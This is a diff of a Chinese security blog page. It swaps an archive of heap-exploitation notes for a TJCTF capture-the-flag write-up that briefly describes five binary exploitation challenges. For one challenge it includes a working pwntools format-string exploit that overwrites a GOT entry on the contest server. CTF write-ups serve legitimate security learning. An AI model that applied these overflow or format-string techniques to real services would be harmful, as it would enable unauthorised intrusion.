@@ -8,17 +8,33 @@
 
 <title>
   
-    彙整: 2018/7
+    tjctf记录
   
 </title>
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="pwndog&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2018/07/index.html">
+<meta name="description" content="前言看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tjctf记录">
+<meta property="og:url" content="http://yoursite.com/2018/08/07/tjctf记录/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
+<meta property="og:description" content="前言看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录">
 <meta property="og:locale" content="CN">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/07/tjctf记录/10.png">
+<meta property="og:updated_time" content="2018-08-07T14:50:11.702Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwndog&#39;s blog">
+<meta name="twitter:title" content="tjctf记录">
+<meta name="twitter:description" content="前言看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/07/tjctf记录/1.png">
 
 
   <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
@@ -146,226 +162,84 @@
       
         <div style="max-width: 1000px">
       
-          
-
+          <article id="post-tjctf记录" class="article article-type-post">
+  
+    <h1 class="article-header">
+      tjctf记录
+    </h1>
   
   
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <h1><a href="/archives/2018" class="archive-year">2018</a></h1>
-        </div>
-        <div class="post-list">
-    
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/29/一次Null-by-one的利用过程/" >
-  一次Null-by-one的利用过程
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/29/一次Null-by-one的利用过程/"><span class="article-date">
-  2018-07-29
+  <div class="article-info">
+    <span class="article-date">
+  2018-08-07
 </span>
-</a>
-        
 
-        
+    
+
+    
 	<span class="article-tag tagcloud">
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
 	</span>
 
 
-      </div>
-      <div class="article-entry">
-        
-          <p>学校比赛的压轴题。<br></p>
-          <p>
-            <a href="/2018/07/29/一次Null-by-one的利用过程/">
-              閱讀全文
-            </a>
-          </p>
-        
-      </div>
-    </div>
+  </div>
+  <div class="article-entry">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看着ctftime上的时间表参加了tjctf的比赛。pwn，re题目非常简单，在今天结束最高到了第二名.(pwn,re做完了，misc太菜)。虽然题目非常简单，类似于国内ISCC，还是简单的做个记录<br><img src="/2018/08/07/tjctf记录/1.png" alt="第一天排名"><br><a id="more"></a></p>
+<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单直接的栈溢出，覆盖到之后的变量就可以得到flag，签到<br><img src="/2018/08/07/tjctf记录/2.png" alt=""><br><img src="/2018/08/07/tjctf记录/3.jpg" alt=""></p>
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>使用srand(time(NULL));通过随机数伪造canary防止栈溢出。<br><img src="/2018/08/07/tjctf记录/4.png" alt=""><br>time（NULL）取到的时间以秒做单位，学到可以通过加载so文件使用time文件得到相同的随机值。<br><img src="/2018/08/07/tjctf记录/6.png" alt=""><br>过了伪造canary直接就可以溢出拿到flag<br><img src="/2018/08/07/tjctf记录/5.png" alt=""></p>
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p><img src="/2018/08/07/tjctf记录/7.png" alt=""><br>题目逻辑就是定义了这么一个结构体，names长度为8，<br>如果strength指针指向位置的最多8个字节的总大小为400可以得到flag。<br>程序存在数组越界，可以输入9次数据，name数组保存的为malloc的地址，堆内容可控。<br>于是输入9次覆盖strength指针，指向的堆又可控，轻松凑出400拿到flag。</p>
+<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p><img src="/2018/08/07/tjctf记录/8.png" alt=""><br>栈溢出，前面可以向bss段写入33字节，配合栈溢出拿到flag,手动使用x64写了一下shellcode。<br><img src="/2018/08/07/tjctf记录/9.png" alt=""></p>
+<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>经典的格式化字符串，本来以为会出一道难一点的。结果是我高估他了。题目给了一个函数直接读取flag，可以通过格式化字符串修改exit got表，同时没有开ASLR。一步搞定，我还以为是改成system拿权限。郁闷直接上代码</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+p=remote(<span class="string">'problem1.tjctf.org'</span>,<span class="number">8008</span>)
+context(log_level=<span class="string">'debug'</span>)
+elf=ELF(<span class="string">'./libc-2.27.so'</span>)
+elfa=ELF(<span class="string">'./8008'</span>)
+p.recvuntil(<span class="string">'First, choose a strong password to protect your message:'</span>)
+putsGOT1=elfa.got[<span class="string">'exit'</span>]
+main=<span class="number">0x08048713</span>
 
-  
+p.sendline(<span class="string">'123'</span>)
+p.recvuntil(<span class="string">'&gt;'</span>)
+X=main&amp;<span class="number">0x000000ff</span>
+X1=(main&amp;<span class="number">0x0000FF00</span>)&gt;&gt;<span class="number">8</span>
+X2=(main&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>
+X3=(main&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>
+payload=p32(putsGOT1
+)+p32(putsGOT1+<span class="number">1</span>)
+payload+=<span class="string">"%."</span>+str(X<span class="number">-8</span>)+<span class="string">"x%35$hhn"</span>
+payload+=<span class="string">"%."</span>+str((X1-X)&amp;<span class="number">0xff</span>)+<span class="string">"x%36$hhn"</span>
+p.sendline(payload)
 
-  
-  
+p.interactive()
+</code></pre>
+<p><img src="/2018/08/07/tjctf记录/10.png" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>过于简单。但是学习了一下基于时间随机的不可靠性。<br>复习了格式化字符串，主要是自己一直想用system。浪费了不少时间<br>最近更新少，接下来没有比赛开始进行经典cve漏洞的调试过程。</p>
+
+  </div>
+  <footer class="article-footer">
     
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/29/从pwnabke.tw第18题看free_hook覆盖/" >
-  从pwnabke.tw第18题看free_hook覆盖
-</a>
-
-      </h3>
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="姓名標示-相同方式分享">
+      <img src="/images/cc/cc.png">
       
-
-      <div class="article-info">
-        <a href="/2018/07/29/从pwnabke.tw第18题看free_hook覆盖/"><span class="article-date">
-  2018-07-29
-</span>
-</a>
+          <img src="/images/cc/by.png">
         
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        本著作係採用創用 CC 姓名標示-相同方式分享 4.0 國際 授權條款授權.
+      </span>
+    </a>
+  </div>
 
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
 
-
-      </div>
-      <div class="article-entry">
-        
-          <p>pwnabke.tw第18题 secret of my heart<br>开始发布在看雪上，现在搬到自己博客。<br>地址为<a href="https://pwnable.tw/challenge/" target="_blank" rel="noopener">https://pwnable.tw/challenge/</a><br></p>
-          <p>
-            <a href="/2018/07/29/从pwnabke.tw第18题看free_hook覆盖/">
-              閱讀全文
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
-
-  
-  
     
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/27/0ctf-heapstorm笔记/" >
-  0ctf heapstorm笔记
-</a>
+  </footer>
+</article>
 
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/27/0ctf-heapstorm笔记/"><span class="article-date">
-  2018-07-27
-</span>
-</a>
-        
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近找到了0CTF2018的原题，对旧题进行了重新的学习，记录一下在学习过程中遇到的问题和新的理解。<br>在做题中参照了sakura大神看雪上的writeup，<a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225973.htm</a><br></p>
-          <p>
-            <a href="/2018/07/27/0ctf-heapstorm笔记/">
-              閱讀全文
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
-
-  
-  
-    
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/25/CTF中的一点小疑惑/" >
-  CTF中的一点小疑惑
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/25/CTF中的一点小疑惑/"><span class="article-date">
-  2018-07-25
-</span>
-</a>
-        
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="关于top-chunk的问题笔记"><a href="#关于top-chunk的问题笔记" class="headerlink" title="关于top chunk的问题笔记"></a>关于top chunk的问题笔记</h3><p>覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。<br>如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。</p>
-<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>因为top chunk 小于0x90后不会放入unsorted bin，会放入fast bin 链表。。</p>
-
-        
-      </div>
-    </div>
-
-  
-
-  
-  
-    
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/24/malloc函数源码笔记/" >
-  malloc函数源码笔记
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/24/malloc函数源码笔记/"><span class="article-date">
-  2018-07-24
-</span>
-</a>
-        
-	<span class="article-category tagcloud">
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/glibc源码阅读/">glibc源码阅读</a></li></ul>
-	</span>
-
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GLIBC/">GLIBC</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h2 id="chunk类型分类"><a href="#chunk类型分类" class="headerlink" title="chunk类型分类"></a>chunk类型分类</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>在32位linux下当请求的空间小于0x64时使用fastbin分配，即申请出来的chunk size&lt;0x50时使用fastbin分配.<br>在32位linux下当请求的空间小于0x80时使用fastbin分配，即申请出来的chunk size&lt;0x90时使用fastbin分配.<br></p>
-          <p>
-            <a href="/2018/07/24/malloc函数源码笔记/">
-              閱讀全文
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
 
 
 
